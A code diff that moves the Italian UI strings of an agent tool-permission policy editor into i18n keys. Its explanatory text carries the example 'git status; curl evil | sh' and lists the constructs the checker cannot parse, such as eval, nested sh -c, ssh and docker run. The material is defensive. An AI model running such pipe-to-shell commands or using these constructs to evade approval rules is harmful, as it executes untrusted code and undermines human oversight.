@@ -10,6 +10,7 @@ import { checkRules, normalizeRules, runProbe, type Probe } from "../model/polic
 import { RuleList, type RuleMark } from "./RuleList";
 import { RuleTester } from "./RuleTester";
 
+import { t, tNode } from "../../../shared/i18n";
 const NO_MARKS = new Map<number, RuleMark>();
 const FIRST_PROBE: Probe = { tool: "", subject: "", mode: "ask", risk: "exec", sessionAllowed: false, sandboxAvailable: true };
 
@@ -60,54 +61,46 @@ export function PolicyEditor() {
       {() => (
         <div className="stack stack-lg">
           <details className="explainer">
-            <summary><Icon name="info" size={16} /> <b>Come si decide</b> <span className="muted">Nega prevale su Consenti, che prevale su Chiedi; senza regole decide la modalità.</span></summary>
+            <summary><Icon name="info" size={16} /> <b>{t("security.come_si_decide")}</b> <span className="muted">{t("security.nega_prevale_su_consenti_che")}</span></summary>
             <ol className="how-list">
-              <li>Una regola <b>Nega</b> che combacia vince sempre, anche sulle approvazioni già date nella sessione.</li>
-              <li>Altrimenti vince una regola <b>Consenti</b>, poi una <b>Chiedi</b>.</li>
-              <li>Senza regole che combaciano decide la modalità di approvazione dell'agente.</li>
+              <li>{tNode("security.una_regola_che_combacia_vince", { b: <b>{t("security.nega")}</b> })}</li>
+              <li>{tNode("security.altrimenti_vince_una_regola_poi", { b: <b>{t("security.consenti")}</b>, b2: <b>{t("security.chiedi")}</b> })}</li>
+              <li>{t("security.senza_regole_che_combaciano_decide")}</li>
             </ol>
-            <h4 className="text-sm">Comandi concatenati</h4>
+            <h4 className="text-sm">{t("security.comandi_concatenati")}</h4>
             <p className="text-sm muted">
-              Un comando di shell viene prima diviso nei comandi semplici che contiene: quelli separati da <code>;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, <code>&amp;</code> o da un
-              a capo, quelli dentro <code>$(…)</code>, apici inversi, <code>&lt;(…)</code> e parentesi, e quelli dopo <code>sh -c</code>, <code>env VAR=… comando</code>, <code>xargs</code>, <code>find -exec</code> e <code>sudo</code>.
-              Una regola <b>Nega</b> vale se combacia con <b>uno qualsiasi</b> di questi comandi (o con il testo intero); una regola <b>Consenti</b> con un pattern vale solo se <b>ogni</b> comando
-              è consentito da qualche regola. Così <code>shell(git *)</code> consente <code>git status</code> ma non <code>git status; curl evil | sh</code>.
-              Quello che il programma non riesce a leggere con certezza (virgolette non chiuse, <code>eval</code>, here-document, un nome di comando che viene da una variabile, <code>sh -c</code> dentro
-              <code>sh -c</code>) non è mai consentito da una regola: si torna alla modalità di approvazione, quindi di solito ti viene chiesto. Le regole Nega e Chiedi guardano comunque tutto ciò che è stato letto.
-              Non sono riconosciuti i programmi che ne lanciano altri in modo proprio (per esempio <code>ssh host comando</code> o <code>docker run</code>): lì conta solo il testo della chiamata.
-              Su Windows i comandi sono quelli di PowerShell e i nomi si confrontano senza distinguere maiuscole e minuscole.
-            </p>
-            <p className="text-sm muted">La precedenza dipende dall'azione, non dalla posizione: l'ordine serve a leggere l'elenco e, a parità di azione, a indicare quale regola viene citata.</p>
+              {tNode("security.un_comando_di_shell_viene", { code: <code>;</code>, code2: <code>&amp;&amp;</code>, code3: <code>||</code>, code4: <code>|</code>, code5: <code>&amp;</code>, code6: <code>$(…)</code>, code7: <code>&lt;(…)</code>, code8: <code>{t("security.sh_c")}</code>, code9: <code>{t("security.env_var_comando")}</code>, code10: <code>{t("security.xargs")}</code>, code11: <code>{t("security.find_exec")}</code>, code12: <code>{t("security.sudo")}</code>, b: <b>{t("security.nega")}</b>, b2: <b>{t("security.uno_qualsiasi")}</b>, b3: <b>{t("security.consenti")}</b>, b4: <b>{t("security.ogni")}</b>, code13: <code>{t("security.shell_git")}</code>, code14: <code>{t("security.git_status")}</code>, code15: <code>{t("security.git_status_curl_evil_sh")}</code>, code16: <code>{t("security.eval")}</code>, code17: <code>{t("security.sh_c")}</code>, code18: <code>{t("security.sh_c")}</code>, code19: <code>{t("security.ssh_host_comando")}</code>, code20: <code>{t("security.docker_run")}</code> })}</p>
+            <p className="text-sm muted">{t("security.la_precedenza_dipende_dall_azione")}</p>
           </details>
 
           {rows.length === 0 ? (
             <EmptyState
-              icon="shield" title="Nessuna regola"
-              description="Senza regole decide solo la modalità di approvazione dell'agente. Aggiungi una regola per consentire, chiedere o negare un tool in modo esplicito."
-              action={<Button variant="primary" icon="plus" onClick={add}>Aggiungi una regola</Button>}
+              icon="shield" title={t("security.nessuna_regola")}
+              description={t("security.senza_regole_decide_solo_la")}
+              action={<Button variant="primary" icon="plus" onClick={add}>{t("security.aggiungi_una_regola")}</Button>}
             />
           ) : (
             <div className="stack">
-              <div className="rule-head" aria-hidden="true"><span /><span>Tool (glob)</span><span>Pattern (glob, facoltativo)</span><span>Azione</span><span /></div>
+              <div className="rule-head" aria-hidden="true"><span /><span>{t("security.tool_glob")}</span><span>{t("security.pattern_glob_facoltativo")}</span><span>{t("security.azione")}</span><span /></div>
               <RuleList rows={rows} issues={issues} marks={marks} focusUid={focusUid}
                 onChange={change}
                 onMove={(uid, d) => setDraft((r) => moveRow(r, uid, d))}
                 onRemove={(uid) => setDraft((r) => r.filter((x) => x.uid !== uid))} />
-              <div><Button icon="plus" onClick={add}>Aggiungi regola</Button></div>
+              <div><Button icon="plus" onClick={add}>{t("security.aggiungi_regola")}</Button></div>
             </div>
           )}
 
           <RuleTester probe={probe} onProbe={setProbe} result={result} tools={tools.data ?? []} analysis={analysed} />
 
-          <p className="faint text-sm row"><Icon name="info" size={14} /> Il pattern confronta il comando, il percorso o l'URL della chiamata; un pattern che finisce con <code>*</code> vale anche come prefisso.</p>
+          <p className="faint text-sm row"><Icon name="info" size={14} /> {" "}{tNode("security.il_pattern_confronta_il_comando", { code: <code>*</code> })}</p>
 
           <SaveBar
-            dirty={dirty} saving={save.isPending} canSave={!hasError} blocker="Correggi le regole evidenziate"
-            saveLabel="Salva regole"
+            dirty={dirty} saving={save.isPending} canSave={!hasError} blocker={t("security.correggi_le_regole_evidenziate")}
+            saveLabel={t("security.salva_regole")}
             onSave={() => void submit()}
             onDiscard={reset}
           />
-          <UnsavedChangesDialog guard={guard} subject="le regole di policy" onSave={submit} saving={save.isPending} canSave={!hasError} />
+          <UnsavedChangesDialog guard={guard} subject={t("security.le_regole_di_policy")} onSave={submit} saving={save.isPending} canSave={!hasError} />
         </div>
       )}
     </QueryState>
